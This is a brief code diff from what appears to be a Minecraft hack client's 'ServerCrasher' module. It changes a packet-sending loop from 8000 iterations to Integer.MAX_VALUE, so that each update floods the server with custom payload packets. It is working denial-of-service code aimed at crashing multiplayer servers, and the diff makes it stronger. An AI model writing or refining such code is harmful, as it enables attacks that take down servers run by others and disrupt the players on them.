@@ -43,7 +43,7 @@ public final class ServerCrasher extends Hack {
 
 	@SubscribeEvent
 	public void onUpdate(WUpdateEvent event) {
-		for (int i = 0; i < 8000; i ++) {
+		for (int i = 0; i < Integer.MAX_VALUE; i ++) {
 			for (String string : strings) {
 				mc.player.connection.sendPacket(new CPacketCustomPayload(string, packetBuffer));
 			}
